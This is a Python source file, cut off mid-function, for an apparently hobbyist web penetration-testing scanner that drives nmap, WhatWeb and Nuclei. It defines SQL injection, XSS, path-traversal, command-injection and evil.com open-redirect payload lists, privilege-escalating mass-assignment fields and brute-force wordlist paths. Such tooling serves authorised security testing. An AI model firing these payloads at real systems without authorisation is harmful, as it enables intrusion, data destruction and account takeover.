#!/usr/bin/env python3

"""
GHOST Scanner - Phantom Web Security Testing Framework
Interactive & Authenticated Edition
Author: 0xgh0stri13y
Description: Full web spidering, directory fuzzing (ffuf with progress), injections, API tests, user enumeration & bruteforce.
"""

import argparse
import base64
import getpass
import re
import signal
import sys
import ssl
import socket
import tempfile
import time
import json
import os
import subprocess
import shutil
import platform
import html
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.robotparser import RobotFileParser


if os.name == 'nt':
    try:
        from prompt_toolkit import prompt
        from prompt_toolkit.completion import PathCompleter
        def input_path(prompt_text):
            return prompt(prompt_text, completer=PathCompleter(), complete_while_typing=True)
    except ImportError:
        def input_path(prompt_text):
            return input(prompt_text)
else:
    try:
        import readline
        import glob
        readline.set_history_length(100)
        class FilePathCompleter:
            def complete(self, text, state):
                line = readline.get_line_buffer().split()
                if not line:
                    return [None][state]
                else:
                    matches = glob.glob(text+'*')
                    try:
                        return matches[state]
                    except IndexError:
                        return None
        readline.set_completer_delims(' \t\n;')
        readline.set_completer(FilePathCompleter().complete)
        readline.parse_and_bind('tab: complete')
        def input_path(prompt_text):
            return input(prompt_text)
    except ImportError:
        def input_path(prompt_text):
            return input(prompt_text)

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("[!] BeautifulSoup4 not installed. Using basic parsing.")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = BLUE = LIGHTBLACK_EX = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    class tqdm:
        def __init__(self, iterable=None, total=None, **kwargs):
            self.iterable = iterable
            self.total = total
        def __iter__(self):
            return iter(self.iterable or [])
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
        def update(self, n=1):
            pass
        def set_postfix(self, *a, **k):
            pass
        def close(self):
            pass

BANNER = r"""
   ____ _  _ ____ ____ ___    ____ ____ ____ _  _ _  _ ____ ____ 
   | __ |__| |  | [__   |     [__  |    |__| |\ | |\ | |___ |__/ 
   |__] |  | |__| ___]  |     ___] |___ |  | | \| | \| |___ |  \ 
"""
DESCRIPTION = "GHOST Scanner — OWASP Web Security Testing"
DEVELOPER = "developed by @0xgh0stri13y"
VERSION = "1.2.0"

DEFAULT_TIMEOUT = 10
MAX_REDIRECTS = 10
THREADS = 5
AUTHENTICATED = False
AUTH_SESSION = None
TARGET_URL = ""
REQUEST_DELAY = 0.0
OUTPUT_FILE = None
VERIFY_TLS = True
USER_AGENT = None        # Custom User-Agent (--user-agent)
HTTP_PROXIES = None      # Proxy map for requests, e.g. Burp (--proxy)
EXTRA_HEADERS = {}       # Extra headers applied to every request (--header)
COOKIE_STRING = ""       # Session cookie string applied to every session (--cookie)
FINDINGS = []
SCAN_DATA = {
    "general": {},
    "authentication": {},
    "robots_paths": [],
    "http_methods": [],
    "nmap": {},
    "active_directory": {},
    "vhosts": [],
    "directory_hits": [],
    "injection": {},
    "api_endpoints": [],
    "users": [],
    "emails": [],
    "bruteforce_credentials": [],
    "wordpress_detection": {},
    "wordpress": {},
    "spider": {},
    "source_code_analysis": {},
    "stats": {},
}

COMMON_DIRS = [
    "admin", "backup", "cgi-bin", "css", "js", "images", "uploads", "download",
    "include", "inc", "config", "api", "v1", "old", "test", "dev", "hidden",
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".env", ".env.backup",
    "phpinfo.php", "info.php", "backup.zip", "backup.sql", "dump.sql",
    "wp-admin", "wp-content", "administrator", "phpmyadmin", "adminer.php",
    ".htaccess", ".htpasswd", "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
    ".well-known/security.txt", "package.json", "composer.json", "server-status"
]

SECLISTS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
SECLISTS_MEDIUM = "/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
SECLISTS_PASSWORDS = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt"
ROCKYOU_WORDLIST = "/usr/share/wordlists/rockyou.txt"
ROCKYOU_WORDLIST_GZ = "/usr/share/wordlists/rockyou.txt.gz"
SECLISTS_DNS = "/usr/share/seclists/Discovery/DNS/namelist.txt"
SECLISTS_USERS = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
SECLISTS_USERS_SHORT = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
DEFAULT_PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123", "admin", "letmein", "welcome"
]

SQL_PAYLOADS = [
    "'", "''", "\"", "\\", "' OR '1'='1", "' OR 1=1--",
    "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
    "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "javascript:alert('XSS')",
    "<svg/onload=alert(1)>", "'-alert(1)-'", "\"-alert(1)-\""
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "....//....//....//etc/passwd"
]

COMMAND_INJECT = [
    "; ls", "| dir", "|| ping -c 1 127.0.0.1", "& whoami",
    "$(whoami)", "`whoami`", "| net user"
]

OPEN_REDIRECT = ["https://evil.com", "//evil.com", "/redirect?url=https://evil.com"]

API_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3", "/rest", "/rest/v1",
    "/api/users", "/api/user", "/api/accounts", "/api/account",
    "/api/admin", "/api/me", "/api/profile", "/api/whoami",
    "/api/config", "/api/settings", "/api/flags", "/api/data",
    "/api/keys", "/api/tokens", "/api/secrets", "/api/credentials",
    "/api/debug", "/api/test", "/api/internal",
    "/rest/users", "/rest/user", "/rest/admin", "/rest/profile",
    "/swagger", "/swagger-ui.html", "/swagger-ui/", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/redoc", "/docs", "/api/docs", "/api/swagger",
    "/graphql", "/graphiql", "/api/graphql", "/query", "/api/query",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/actuator/beans", "/actuator/httptrace", "/actuator/loggers",
    "/health", "/metrics", "/info", "/status", "/ping",
    "/api/auth", "/api/login", "/api/token", "/api/refresh",
    "/api/register", "/api/signup",
    "/.well-known/", "/api/version", "/api/changelog",
    "/console", "/api/console", "/h2-console",
]

MASS_ASSIGNMENT_FIELDS = [
    {"is_admin": True},
    {"role": "admin"},
    {"admin": True},
    {"isAdmin": True},
    {"privilege": "admin"},
    {"user_role": "administrator"},
    {"account_type": "premium"},
    {"verified": True},
    {"status": "active"},
    {"credits": 9999},
    {"balance": 9999},
    {"permissions": ["admin", "superuser"]},
]

LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/logon", "/login.php", "/login.html",
    "/user/login", "/account/login", "/admin/login", "/wp-login.php"
]

API_BASE_PREFIXES = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    "/rest", "/rest/v1", "/rest/v2",
    "/services", "/services/api",
]

API_RESOURCES = [
    "users", "user", "accounts", "account", "me", "profile", "whoami",
    "auth", "login", "logout", "register", "signup", "signin",
    "token", "tokens", "refresh", "session", "sessions",
    "password", "reset-password", "forgot-password", "2fa", "mfa", "otp",
    "admin", "config", "settings", "flags", "feature-flags",
    "permissions", "roles", "groups", "privileges",
    "audit", "audit-log", "logs", "events",
    "data", "items", "products", "orders", "invoices", "payments",
    "transactions", "transfer", "transfers", "wallets", "balance",
    "subscriptions", "plans", "billing", "cart", "checkout",
    "notes", "messages", "chats", "comments", "posts", "articles",
    "files", "uploads", "documents", "attachments", "media", "images",
    "search", "filter", "query", "tags", "categories",
    "stats", "metrics", "health", "status", "version", "info",
    "debug", "test", "internal", "private", "hidden",
    "keys", "secrets", "credentials", "api-keys",
    "export", "import", "backup", "dump", "report", "reports",
    "notifications", "webhooks", "callbacks", "subscribe",
    "feed", "feeds", "activity", "history",
]

def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def check_ffuf():
    return shutil.which("ffuf") is not None

def check_wpscan():
    return shutil.which("wpscan")

def install_wpscan():
    """Offer to install WPScan via gem if not available."""
    print_warning("WPScan is not installed or not in PATH.")
    if os.name == 'nt':
        print_info("Install it manually with Ruby/Gem or run the scanner from Kali/WSL: gem install wpscan")
        return False
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install WPScan automatically with sudo gem install wpscan? [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 'yes'):
        return False
    try:
        print_info("Running: sudo gem install wpscan")
        subprocess.run(["sudo", "gem", "install", "wpscan"], check=True)
        if check_wpscan():
            print_good("WPScan installed successfully.")
            return True
        print_error("Installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install WPScan: {e}")
        return False

def _wait_for_interrupted_child(process, name="process", grace_seconds=5):
    """Give an interrupted child process time to flush files before killing it."""
    if not process:
        return None
    if process.poll() is not None:
        return process.returncode

    try:
        return process.wait(timeout=grace_seconds)
    except subprocess.TimeoutExpired:
        pass

    if os.name != 'nt' and process.poll() is None:
        try:
            process.send_signal(signal.SIGINT)
            return process.wait(timeout=2)
        except Exception:
            pass

    if process.poll() is None:
        print_warning(f"{name} did not finish after Ctrl+C; terminating process.")
        try:
            process.terminate()
            return process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
            try:
                return process.wait(timeout=2)
            except Exception:
                return process.returncode
        except Exception:
            return process.returncode
    return process.returncode

def _load_ffuf_json_results(path):
    if not path or not os.path.isfile(path) or os.path.getsize(path) <= 2:
        return []
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    if isinstance(data, dict):
        results = data.get('results', [])
        return results if isinstance(results, list) else []
    if isinstance(data, list):
        return data
    return []

def check_whatweb():
    return shutil.which("whatweb") is not None

def install_whatweb():
    """Offer to install WhatWeb via apt if not available."""
    print_warning("WhatWeb is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install WhatWeb automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 'yes'):
        return False
    try:
        print_info("Running: sudo apt-get install -y whatweb")
        ret = subprocess.run(
            ["sudo", "apt-get", "install", "-y", "whatweb"],
            check=True
        )
        if check_whatweb():
            print_good("WhatWeb installed successfully.")
            return True
        else:
            print_error("Installation appears to have failed.")
            return False
    except Exception as e:
        print_error(f"Could not install WhatWeb: {e}")
        return False

def run_whatweb(target, session=None):
    """Run WhatWeb and format its output."""
    if not check_whatweb():
        if not install_whatweb():
            return None

    CATEGORY_COLOR = {
        'cms':         Fore.MAGENTA,
        'framework':   Fore.MAGENTA,
        'language':    Fore.CYAN,
        'server':      Fore.CYAN,
        'javascript':  Fore.YELLOW,
        'jquery':      Fore.YELLOW,
        'analytics':   Fore.YELLOW,
        'security':    Fore.GREEN,
        'email':       Fore.WHITE,
        'country':     Fore.WHITE,
        'ip':          Fore.WHITE,
        'title':       Fore.WHITE,
        'httpserver':  Fore.CYAN,
        'x-powered-by':Fore.CYAN,
    }

    try:
        cmd = ["whatweb", "--color=never"]
        cmd = _append_whatweb_session_options(cmd, session)
        cmd.append(target)
        if session and _external_http_headers_from_session(session):
            print_info("WhatWeb will use headers/cookies from the authenticated session.")
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30
        )
        raw = result.stdout.strip()
        if not raw:
            print_warning("WhatWeb returned no results.")
            return []

        technologies = []
        SEP = "─" * 60
        print(f"\n{Fore.CYAN}{SEP}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  WHATWEB — Technology Detection{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}")

        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue
            bracket_match = re.match(r'^(https?://\S+)\s+\[([^\]]+)\]\s*(.*)', line)
            if not bracket_match:
                print(f"  {line}")
                continue

            url_part    = bracket_match.group(1)
            status_part = bracket_match.group(2)
            plugins_raw = bracket_match.group(3)

            http_code = status_part.split()[0] if status_part else ''
            if http_code.startswith('2'):
                sc = Fore.GREEN
            elif http_code.startswith('3'):
                sc = Fore.CYAN
            elif http_code.startswith('4'):
                sc = Fore.YELLOW
            elif http_code.startswith('5'):
                sc = Fore.RED
            else:
                sc = Fore.WHITE

            print(f"  {Fore.WHITE}{url_part}{Style.RESET_ALL}  "
                  f"{sc}[{status_part}]{Style.RESET_ALL}")

            if not plugins_raw:
                continue

            plugins = []
            depth, start = 0, 0
            for i, ch in enumerate(plugins_raw):
                if ch == '[':
                    depth += 1
                elif ch == ']':
                    depth -= 1
                elif ch == ',' and depth == 0:
                    p = plugins_raw[start:i].strip()
                    if p:
                        plugins.append(p)
                    start = i + 1
            tail = plugins_raw[start:].strip()
            if tail:
                plugins.append(tail)

            for plugin in plugins:
                pm = re.match(r'^([A-Za-z0-9_\-\./ ]+?)(?:\[(.+)\])?$', plugin, re.DOTALL)
                if pm:
                    name = pm.group(1).strip()
                    value = pm.group(2).strip() if pm.group(2) else ''
                else:
                    name, value = plugin.strip(), ''

                technologies.append({"name": name, "detail": value})
                key = name.lower().replace(' ', '').replace('-', '')
                color = next(
                    (v for k, v in CATEGORY_COLOR.items() if k in key),
                    Fore.WHITE
                )
                if value:
                    print(f"    {color}▸ {name:<28}{Style.RESET_ALL}  "
                          f"{Fore.WHITE}{value[:60]}{Style.RESET_ALL}")
                else:
                    print(f"    {color}▸ {name}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}\n")
        seen = set()
        unique_techs = []
        for t in technologies:
            key = (t['name'], t['detail'])
            if key not in seen:
                seen.add(key)
                unique_techs.append(t)
        return unique_techs

    except subprocess.TimeoutExpired:
        print_error("WhatWeb timed out (30s).")
        return None
    except Exception as e:
        print_error(f"Error running WhatWeb: {e}")
        return None

def check_nmap():
    return shutil.which("nmap")

def install_nmap():
    """Offer to install nmap via apt if not available."""
    print_warning("nmap is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install nmap automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 'yes'):
        return False
    try:
        print_info("Running: sudo apt-get install -y nmap")
        subprocess.run(["sudo", "apt-get", "install", "-y", "nmap"], check=True)
        if check_nmap():
            print_good("nmap installed successfully.")
            return True
        print_error("Installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install nmap: {e}")
        return False

def run_nmap_scan(target):
    """Run `nmap -sV` on the target host and store ports in SCAN_DATA["nmap"].

    Parses XML output (-oX -) for robust extraction of port, state,
    service, product and version. Shows visual table when finished.
    """
    print_phase("PORT SCANNING (NMAP)")
    nmap_path = check_nmap()
    if not nmap_path:
        if not install_nmap():
            print_warning("Skipping port scan.")
            return None
        nmap_path = check_nmap()
        if not nmap_path:
            return None

    host = urlparse(target).hostname or target
    if not host:
        print_error("Could not extract host from target.")
        return None

    print_info(f"Running: nmap -sV {host}")
    print()
    try:
        proc = subprocess.run(
            [nmap_path, "-sV", "-oX", "-", host],
            capture_output=True, text=True, timeout=1800
        )
    except subprocess.TimeoutExpired:
        print_error("nmap exceeded 600s timeout.")
        return None
    except KeyboardInterrupt:
        print_warning("Port scan interrupted by user.")
        return None
    except Exception as e:
        print_error(f"Error running nmap: {e}")
        return None

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        if proc.stderr:
            print_error(proc.stderr.strip().splitlines()[-1] if proc.stderr.strip() else f"nmap rc={proc.returncode}")
        else:
            print_error(f"nmap rc={proc.returncode}")
        return None

    ports = []
    host_info = {"address": host, "hostnames": [], "status": ""}
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(xml_out)
        for h in root.findall("host"):
            status_el = h.find("status")
            if status_el is not None:
                host_info["status"] = status_el.get("state", "")
            for addr in h.findall("address"):
                if addr.get("addrtype") in ("ipv4", "ipv6"):
                    host_info["address"] = addr.get("addr") or host_info["address"]
            for hn in h.findall("hostnames/hostname"):
                name = hn.get("name")
                if name:
                    host_info["hostnames"].append(name)
            for p in h.findall("ports/port"):
                state_el = p.find("state")
                svc_el = p.find("service")
                if state_el is None:
                    continue
                state = state_el.get("state", "")
                if state not in ("open", "open|filtered"):
                    continue
                entry = {
                    "port": int(p.get("portid", 0)),
                    "protocol": p.get("protocol", ""),
                    "state": state,
                    "service": (svc_el.get("name") if svc_el is not None else "") or "",
                    "product": (svc_el.get("product") if svc_el is not None else "") or "",
                    "version": (svc_el.get("version") if svc_el is not None else "") or "",
                    "extrainfo": (svc_el.get("extrainfo") if svc_el is not None else "") or "",
                }
                ports.append(entry)
    except Exception as e:
        print_error(f"Error parsing nmap XML: {e}")
        return None

    ports.sort(key=lambda x: (x.get("port", 0), x.get("protocol", "")))

    if ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        rows = []
        for p in ports:
            color = STATE_COLOR.get(p["state"], Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join([v for v in version_parts if v]).strip() or "-"
            if len(version_str) > 60:
                version_str = version_str[:57] + "..."
            rows.append([
                f"{p['port']}/{p['protocol']}",
                f"{color}{p['state']}{Style.RESET_ALL}",
                p.get("service", "") or "-",
                version_str,
            ])
        print_table(
            headers=["PORT", "STATE", "SERVICE", "VERSION"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports ({len(ports)}):",
        )
        for p in ports:
            label = p.get("service", "") or "?"
            version_str = " ".join(
                [v for v in (p.get("product", ""), p.get("version", "")) if v]
            ).strip()
            FINDINGS.append(
                f"[PORT] {host_info['address']}:{p['port']}/{p['protocol']} "
                f"{label}" + (f" ({version_str})" if version_str else "")
            )
    else:
        print_info("nmap found no visible open ports.")

    SCAN_DATA["nmap"] = {
        "host": host_info["address"],
        "hostnames": host_info["hostnames"],
        "status": host_info["status"],
        "ports": ports,
        "command": f"nmap -sV {host}",
    }
    return SCAN_DATA["nmap"]


def _parse_nmap_xml(xml_out, include_scripts=False):
    host_info = {"address": "", "hostnames": [], "status": "", "host_scripts": []}
    ports = []
    import xml.etree.ElementTree as ET
    root = ET.fromstring(xml_out)

    def _script_element_to_dict(el):
        item = {
            "key": el.get("key") or el.get("id") or "",
            "text": (el.text or "").strip(),
            "children": [],
        }
        for child in list(el):
            item["children"].append(_script_element_to_dict(child))
        return item

    def _script_to_dict(script_el):
        return {
            "id": script_el.get("id", ""),
            "output": script_el.get("output", "") or "",
            "elements": [_script_element_to_dict(child) for child in list(script_el)],
        }

    for h in root.findall("host"):
        status_el = h.find("status")
        if status_el is not None:
            host_info["status"] = status_el.get("state", "")
        for addr in h.findall("address"):
            if addr.get("addrtype") in ("ipv4", "ipv6"):
                host_info["address"] = addr.get("addr") or host_info["address"]
        for hn in h.findall("hostnames/hostname"):
            name = hn.get("name")
            if name:
                host_info["hostnames"].append(name)
        if include_scripts:
            for script_el in h.findall("hostscript/script"):
                host_info["host_scripts"].append(_script_to_dict(script_el))
        for p in h.findall("ports/port"):
            state_el = p.find("state")
            svc_el = p.find("service")
            if state_el is None:
                continue
            state = state_el.get("state", "")
            if state not in ("open", "open|filtered"):
                continue
            entry = {
                "port": int(p.get("portid", 0)),
                "protocol": p.get("protocol", ""),
                "state": state,
                "service": (svc_el.get("name") if svc_el is not None else "") or "",
                "product": (svc_el.get("product") if svc_el is not None else "") or "",
                "version": (svc_el.get("version") if svc_el is not None else "") or "",
                "extrainfo": (svc_el.get("extrainfo") if svc_el is not None else "") or "",
            }
            if include_scripts:
                entry["scripts"] = [_script_to_dict(s) for s in p.findall("script")]
            ports.append(entry)
    ports.sort(key=lambda x: (x.get("port", 0), x.get("protocol", "")))
    return host_info, ports

def _nmap_targeted_port_spec(ports):
    tcp = sorted({int(p.get("port")) for p in ports if p.get("protocol") == "tcp" and p.get("port")})
    udp = sorted({int(p.get("port")) for p in ports if p.get("protocol") == "udp" and p.get("port")})
    if tcp and not udp:
        return ",".join(str(p) for p in tcp), False
    parts = []
    if tcp:
        parts.append("T:" + ",".join(str(p) for p in tcp))
    if udp:
        parts.append("U:" + ",".join(str(p) for p in udp))
    return ",".join(parts), bool(udp)

def _nmap_http_script_args(session):
    args = []
    if not session:
        return args
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        args.append(f"http.useragent={user_agent}")
    cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
    if cookie_string:
        args.append(f"http.cookie={cookie_string}")
    return args

def _nmap_script_interesting(script):
    output = (script.get("output") or "").lower()
    indicators = (
        "vulnerable", "cve-", "exploit", "risk factor", "state: vulnerable",
        "backdoor", "dos", "xss", "sql injection", "csrf", "traversal",
    )
    return any(ind in output for ind in indicators)

def _run_nmap_nse_scan(nmap_path, host, host_info, ports, session=None):
    if not ports:
        return {"executed": False, "reason": "no-open-ports", "results": []}

    port_spec, has_udp = _nmap_targeted_port_spec(ports)
    if not port_spec:
        return {"executed": False, "reason": "no-port-spec", "results": []}

    cmd = [
        nmap_path, "-sV",
        "--script", "default,vuln,safe",
        "-p", port_spec,
        "-oX", "-",
    ]
    if has_udp:
        cmd.insert(1, "-sU")
    script_args = _nmap_http_script_args(session)
    if script_args:
        cmd += ["--script-args", ",".join(script_args)]
    cmd.append(host)

    visible_cmd = _format_external_command(cmd)
    print_info(f"Running targeted NSE scan: {visible_cmd}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=2400)
    except subprocess.TimeoutExpired:
        print_error("nmap NSE exceeded 2400s timeout.")
        return {"executed": True, "command": visible_cmd, "error": "timeout", "results": []}
    except KeyboardInterrupt:
        print_warning("NSE scan interrupted by user.")
        return {"executed": True, "command": visible_cmd, "error": "interrupted", "results": []}
    except Exception as e:
        print_error(f"Error running nmap NSE: {e}")
        return {"executed": True, "command": visible_cmd, "error": str(e), "results": []}

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        err = (proc.stderr or "").strip()
        if err:
            print_error(err.splitlines()[-1])
        else:
            print_error(f"nmap NSE rc={proc.returncode}")
        return {"executed": True, "command": visible_cmd, "returncode": proc.returncode, "error": err, "results": []}

    try:
        _nse_host, nse_ports = _parse_nmap_xml(xml_out, include_scripts=True)
    except Exception as e:
        print_error(f"Error parsing nmap NSE XML: {e}")
        return {"executed": True, "command": visible_cmd, "error": str(e), "results": []}

    results = []
    for p in nse_ports:
        for script in p.get("scripts", []) or []:
            output = (script.get("output") or "").strip()
            if not output:
                continue
            item = {
                "host": host_info.get("address") or host,
                "port": p.get("port"),
                "protocol": p.get("protocol"),
                "service": p.get("service"),
                "script_id": script.get("id", ""),
                "output": output,
                "interesting": _nmap_script_interesting(script),
            }
            results.append(item)
            if item["interesting"]:
                first_line = output.splitlines()[0][:160]
                _append_finding_once(
                    f"[NMAP:NSE] {item['host']}:{item['port']}/{item['protocol']} "
                    f"{item['script_id']} - {first_line}"
                )

    by_key = {(p.get("port"), p.get("protocol")): p for p in ports}
    for p in nse_ports:
        key = (p.get("port"), p.get("protocol"))
        if key in by_key and p.get("scripts"):
            by_key[key]["scripts"] = p.get("scripts")

    if results:
        rows = []
        for item in results[:40]:
            color = Fore.RED if item.get("interesting") else Fore.CYAN
            first_line = item.get("output", "").splitlines()[0][:90]
            rows.append([
                f"{item.get('port')}/{item.get('protocol')}",
                item.get("service") or "-",
                f"{color}{item.get('script_id')}{Style.RESET_ALL}",
                first_line,
            ])
        print_table(
            headers=["Port", "Service", "Script", "Result"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Targeted NSE results ({len(results)} scripts with output):",
        )
        if len(results) > 40:
            print_info(f"... and {len(results) - 40} more NSE results in the report.")
    else:
        print_info("Targeted NSE scan returned no relevant output.")

    return {
        "executed": True,
        "command": visible_cmd,
        "returncode": proc.returncode,
        "ports_scanned": port_spec,
        "results": results,
    }

def run_nmap_scan(target, session=None):
    """Run nmap -sV then targeted NSE on found ports."""
    print_phase("PORT SCANNING (NMAP)")
    nmap_path = check_nmap()
    if not nmap_path:
        if not install_nmap():
            print_warning("Skipping port scan.")
            return None
        nmap_path = check_nmap()
        if not nmap_path:
            return None

    host = urlparse(target).hostname or target
    if not host:
        print_error("Could not extract host from target.")
        return None

    print_info(f"Running: nmap -sV {host}")
    print()
    try:
        proc = subprocess.run(
            [nmap_path, "-sV", "-oX", "-", host],
            capture_output=True, text=True, timeout=1800
        )
    except subprocess.TimeoutExpired:
        print_error("nmap exceeded 1800s timeout.")
        return None
    except KeyboardInterrupt:
        print_warning("Port scan interrupted by user.")
        return None
    except Exception as e:
        print_error(f"Error running nmap: {e}")
        return None

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        if proc.stderr:
            print_error(proc.stderr.strip().splitlines()[-1] if proc.stderr.strip() else f"nmap rc={proc.returncode}")
        else:
            print_error(f"nmap rc={proc.returncode}")
        return None

    try:
        host_info, ports = _parse_nmap_xml(xml_out, include_scripts=False)
        host_info["address"] = host_info.get("address") or host
    except Exception as e:
        print_error(f"Error parsing nmap XML: {e}")
        return None

    if ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        rows = []
        for p in ports:
            color = STATE_COLOR.get(p["state"], Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join([v for v in version_parts if v]).strip() or "-"
            if len(version_str) > 60:
                version_str = version_str[:57] + "..."
            rows.append([
                f"{p['port']}/{p['protocol']}",
                f"{color}{p['state']}{Style.RESET_ALL}",
                p.get("service", "") or "-",
                version_str,
            ])
        print_table(
            headers=["PORT", "STATE", "SERVICE", "VERSION"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports ({len(ports)}):",
        )
        for p in ports:
            label = p.get("service", "") or "?"
            version_str = " ".join(
                [v for v in (p.get("product", ""), p.get("version", "")) if v]
            ).strip()
            _append_finding_once(
                f"[PORT] {host_info['address']}:{p['port']}/{p['protocol']} "
                f"{label}" + (f" ({version_str})" if version_str else "")
            )
    else:
        print_info("nmap found no visible open ports.")

    nse_data = _run_nmap_nse_scan(nmap_path, host, host_info, ports, session=session) if ports else {
        "executed": False,
        "reason": "no-open-ports",
        "results": [],
    }

    SCAN_DATA["nmap"] = {
        "host": host_info["address"],
        "hostnames": host_info["hostnames"],
        "status": host_info["status"],
        "ports": ports,
        "command": f"nmap -sV {host}",
        "nse": nse_data,
        "nse_results": nse_data.get("results", []),
    }
    return SCAN_DATA["nmap"]


def check_nuclei():
    return shutil.which("nuclei")

def install_nuclei():
    """Offer to install Nuclei via apt if not available."""
    print_warning("Nuclei is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install Nuclei automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 'yes'):
        return False
    try:
        print_info("Running: sudo apt-get install -y nuclei")
        subprocess.run(["sudo", "apt-get", "install", "-y", "nuclei"], check=True)
        if check_nuclei():
            print_good("Nuclei installed successfully.")
            return True
        print_error("Installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install Nuclei: {e}")
        return False

def run_nuclei_scan(target, session=None):
    """Run Nuclei on target and accumulate results in SCAN_DATA."""
    print_phase("VULNERABILITY ANALYSIS")
    nuclei_path = check_nuclei()
    if not nuclei_path:
        if not install_nuclei():
            print_warning("Skipping Nuclei analysis.")
            return None
        nuclei_path = check_nuclei()
        if not nuclei_path:
            return None

    print_info(f"Running Nuclei on {target}...")
    findings = []
    process = None
    json_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False) as tmp_json:
            json_path = tmp_json.name
        cmd = [nuclei_path, "-u", target, "-jsonl-export", json_path]
        cmd = _append_nuclei_session_headers(cmd, session)
        if session and _external_http_headers_from_session(session):
            print_info("Nuclei will use headers/cookies from the authenticated session.")
        NOISE_PATTERNS = (
            b"Could not unmarshal interaction data",
        )
        def _stream(proc):
            for raw_line in iter(proc.stdout.readline, b""):
                if any(pat in raw_line for pat in NOISE_PATTERNS):
                    continue
                try:
                    print(raw_line.decode("utf-8", errors="replace"), end='')
                except Exception:
                    pass
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        _stream(process)
        process.wait()

        if (not os.path.isfile(json_path) or os.path.getsize(json_path) == 0):
            try:
                cmd_alt = [nuclei_path, "-u", target, "-json-export", json_path]
                cmd_alt = _append_nuclei_session_headers(cmd_alt, session)
                proc2 = subprocess.Popen(cmd_alt, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                _stream(proc2)
                proc2.wait()
